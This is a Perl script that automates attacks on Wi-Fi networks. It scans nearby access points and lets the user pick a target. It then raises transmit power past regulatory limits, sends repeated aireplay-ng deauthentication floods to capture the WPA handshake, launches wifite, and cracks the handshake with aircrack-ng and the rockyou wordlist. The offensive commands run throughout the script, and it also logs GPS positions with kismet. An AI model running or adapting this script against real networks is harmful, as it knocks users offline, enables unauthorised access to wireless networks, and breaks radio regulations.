#!/usr/bin/perl

use strict;
use warnings;
use Data::Dumper;

my $interface = "wlan1";
my $expected_mon = $interface . "mon";

#iw dev wlan1 interface add mon0 type monitor
#iw dev wlan0 get power_save
#iw dev wlan1 set txpower 

my @data = get_aps();
menu( );
#print Dumper @data;
#start_kistmet();

#system( "screen -Adms aireplay-ng aireplay-ng -0 15 -a $bssid $expected_mon " );


sub start_kismet {
if( !(`screen -ls` =~ /kistmet/) ){
	my $is_running = 0;
	print "\n Starting kismet server in screen";

	print "\n Starting GPS,  open BlueNMea";
	system( "gpsd -N -n -D5 tcp://localhost:4352" );
	system( "sleep 5" );
	system(" screen -AdmS kismet kismet  --use-gpsd-gps -g --daemonize ");
} else {
	print "\n Kismet is alreay running\n";
}
}
#########################################################################

=pod
	[ get_aps ]
	Parses iwlist results for interface
=cut
sub get_aps {
	
	my @data;
	
	## bring interface up
	if( !(`iwconfig $expected_mon` =~ /$expected_mon/) ){
	my $not_up = 1;
	while( $not_up ){

		#system( "ifconfig $interface up" );
		system( "sleep 1" );

		if( `ifconfig $interface` =~ /$interface/ ){
			$not_up = 0;
			print "\n Found Interface: \n" . `ifconfig $interface`;
		} else {
			
			my $check_monitor = `ifconfig $expected_mon`;

			system( "ifconfig $interface up" );


			system( "sleep 5" );   print "\n Sleeping...";
		}
	}
	print "\niwconfig: " . `iwconfig $interface`;
	
	}

	
	print "\n Scanning iwlist on $interface\n";
	my $iwlist = `iwlist wlan0 scan`; 	#iwlist $interface scan | grep Frequency | sort | uniq -c | sort -n
	my @output = split "Cell ", $iwlist;

	if( scalar @output <= 0 ){
		print "\nNo Acess Points\n\n";
	exit;
	}
	for( my $i = 1; $i < scalar @output;$i++ ){
	
		if( $output[ $i ] && $output[ $i ] ne "" ){ 

			print "\n $output[ $i ]";	## debug parsing
			my @ap = split "\n", $output[ $i ];
			my  $h = {};
			foreach my  $line ( @ap ){
		
			## parse output line
			if( $line eq "" ){
				next;
			} else {
				if( $line =~ /Address:/ ){

					$h->{address} = substr  $line, 14;
				} elsif( $line =~ /Encryption key:/ ){

				     $line =~ s/^\s+|\s+$//g;
				     $h->{encryption} = $line;
				}elsif( $line =~ /Quality/ && $line =~ /Signal level/ ){

				     $line =~ s/^\s+|\s+$//g;
				     $h->{quality} = substr $line, 8,5;
				     $h->{signal} = substr $line, 28,3;
				}elsif( $line =~ /Channel:/ ){
				     my ($channel) = $line =~ /(\d+)/;
	#			     $line =  substr $line, 7,-1;
				     ##chomp $line;
				     #$line =~ s/^\s+|\s+$//g;
				     $h->{channel} = $channel;
				}elsif( $line =~ /Frequency:/ ){
				     #$line =  substr $line, 10,8;
				     my ($freq) = $line =~ /([0-9]*\.[0-9]+|[0-9]+)/;
				   #  $line =~ s/^\s+|\s+$//g;
				    # chomp $line;
				    # $line =~ s/^\s+|\s+$//g;
				     $h->{freq} = $freq;

				} elsif( $line =~ /ESSID:/ ){
				        $line =~ s/^\s+|\s+$//g;
					$h->{essid} = substr $line, 7, -1;  
				}
			}
		}
		
		push @data, $h;
	}

	## sort array by signal level
	#my @keys = sort { $data->{signal}} <=> $h->{signal} } keys(%$h);
	#my @vals = @{$h}{@keys};

	}
	return @data;
}

sub start_wifite {
	my $AP = shift;
	if( !$AP ){
		print "\n No AP selected";
	system( "wifite" );

	} else {
#--wpa                 Only target WPA networks (works with --wps --wep).
#  --wpat WPAT           Time to wait for WPA attack to complete (seconds).
#  --wpadt WPADT         Time to wait between sending deauth packets (seconds).
	#print `iwconfig $expected_mon`;	
	print "\n Starting Wifite ";
	my $cmd = "wifite -i $interface --wpa -mac -showb --all --mon-iface $expected_mon --power 70  --TX 30 -c $AP->{channel} -b $AP->{address}";
	print "\n$cmd\n";
	system( $cmd );
	print "\n$cmd\n";
	print `iwconfig $expected_mon`;	
	}
}

sub auto_handshake {
	my @data = shift;
	if( !@data || scalar @data <= 0 ){
		print "\n No data";
		return;
	}
}

sub selection {
	
	my $selection = shift;
	if( !@data || scalar @data <= 0 ){
		print "\n No data";
		return;
	}
	my $num_ap = scalar @data;
	print "\n Found:  $num_ap";
	for( my $i = 1; $i < scalar @data; $i++){
	        print "\n $i) ";
		print $data[ $i ]->{address} . " - " if( $data[ $i ]->{address} );
		( defined $data[ $i ]->{essid} && $data[ $i ]->{essid} ne "" ) ? print sprintf( "%30s", $data[ $i ]->{essid} ) : print sprintf( "%30s", "< length 0 >" );
		print sprintf( "%10s", $data[ $i ]->{signal} )  if( $data[ $i ]->{signal} );
		print sprintf( "%10s", $data[ $i ]->{freq} ) if( $data[ $i ]->{freq} );	
		print " ( ch: " . sprintf( "%6s", $data[ $i ]->{channel} ) . " )"  if( $data[ $i ]->{channel} );	
	}

#	print "\n q) quit\n";
	my $index = 1;
	
	#wait for user response
	for(;;){
		print "\nSelection: ";
		## user input to quit
		my $wait = <STDIN>; chomp $wait; if( $wait eq "q" ){exit;}
		if( $wait ne "" && ( int( $wait ) > 0 || int( $wait ) < scalar @data ) ){
			$index = $wait; last;
		}else {
			$index = $selection;
		}
	}
	
	print "\n You Selected: $index - " . Dumper $data[ int($index) ];

	my $AP = $data[ int( $index ) ];
	return $AP;
}

sub get_handshake{ 

	my $AP = shift;
	

	my $channel = $AP->{channel};
	start_monitor( $channel );
	print `iwconfig $expected_mon`;


	if( $channel  ne "" ){
	my $bssid = $AP->{address};
	my $essid = $AP->{essid};
	my $screens = `screen -ls`;
	print "\n$screens";
	#print "\nairodump-ng is already running" if( $screens =~ /airodump-ng/);
	system( "screen -AdmS airodump-ng airodump-ng $expected_mon --bssid $bssid -c $channel -w out" );
	system( "sleep 1");
	#system( "screen -Adms aireplay-ng aireplay-ng -0 15 -a $bssid -e \"$essid\"$expected_mon " );
	#	system( "aireplay-ng stop $expected_mon" );
	my $cmd = "aireplay-ng $expected_mon  -0 15 -a $bssid -e \"$essid\"";
	for(;;){
		print "\n Deauth: $cmd \n";
		system( "$cmd" );
		system("sleep 1");
		my $check =  `wifite -b $bssid -e "$essid" --check out.cap| grep aircrack`;
		print $check;		

		print "\n Deauth again? y or no:  ";
		my $ask1 = <STDIN>; chomp $ask1; 
		if( $ask1 ne "y" ){ 
		    last;
		}
	}
	#print "\n Merging Hash files";
	#system("wpaclean tmp.cap out*.cap; mv out* /tmp; sleep 1; mv tmp.cap out.cap");
	print "\n Crack handshake y or (N):"; 
	my $ask = <STDIN>; chomp $ask; 
	if( $ask eq "y" ){ 

		system(" screen -AmS aircrack  aircrack-ng out.cap -b $bssid -w /usr/share/wordlists/rockyou.txt");
	}
	system( "screen -wipe; " );

	#system( "aircrack-ng out*.cap" );
	}
}

sub set_channel {
	my $channel = shift || die("No channel provided");
	print "\n Setting Channel: $channel.\n";
	system( "ifconfig $interface up" );
	#system( "sleep 2");
	#system( "iwconfig $interface mode monitor");
    	system( "iw dev $expected_mon set channel $channel");
	#system( "iwconfig $interface mode managed");
	system( "sleep 1");
	system( "iwconfig $interface" );
}

sub set_freq {
	my $freq = shift;
	print "\n Setting Frequency to $freq -unimplemented\n\n";
}


sub stop_interface {
	my $exists = `ifconfig $expected_mon`;
	if( $exists =~ /$expected_mon/ ){
		system( "airmon-ng stop $expected_mon");
	}
}
sub start_monitor {
	my $channel = shift;
	stop_interface();
	system("iw reg set BO; iwconfig $interface channel 13; iwconfig $interface  txpower 30");
	
	system( "ifconfig $interface up " );
	#system( "iwconfig $interface mode managed");
	if( $channel ){
		system( "airmon-ng start $interface $channel");
	} else {
		system( "airmon-ng start $interface ");
	}
#	system( "airmon-ng check kill ");
	system( "iwconfig $expected_mon ");
}	

sub menu{
	
	my $selection = 1;
	$selection = selection( $selection );
	
	## count aps
	for(;;){	
	
		system( "clear" );
		#print Dumper( @data );

		print "\n ----- Menu ----- \n";
		my $num_ap = scalar @data;
		print "\n APs: $num_ap";
		print "\n Current: " . Dumper(  $selection ) if( $selection );
		print "\n -----------------";
		print "\n 1) List AP's ";
		print "\n 2) Rescan ";
		print "\n 3) Wifite ";
		print "\n 4) Get Handshake ";
		print "\n q) quit";
		print "\n\nSelection: ";
		
		my $wait = <STDIN>; chomp $wait;
		
		if( $wait eq "1" ){
			$selection = selection( $selection );
		} elsif( $wait eq "2" ) {
			
			print "\nRescanning";
			get_aps();
			#print "\nPress any key to continue"; $wait = <STDIN>;			
			
		} elsif( $wait eq "3" ) {
			start_wifite($selection);
			#print "\nPress any key to continue"; $wait = <STDIN>;			

		} elsif( $wait eq "4" ) {
			get_handshake( $selection );

		} elsif( $wait eq "5" ) {
			print "\nPress any key to continue"; $wait = <STDIN>;			

		} elsif( $wait eq "q" ){
			stop_interface();
			exit;
		} else {

			$selection = selection($selection);
			start_wifite($selection);
		}
	}
}
1;
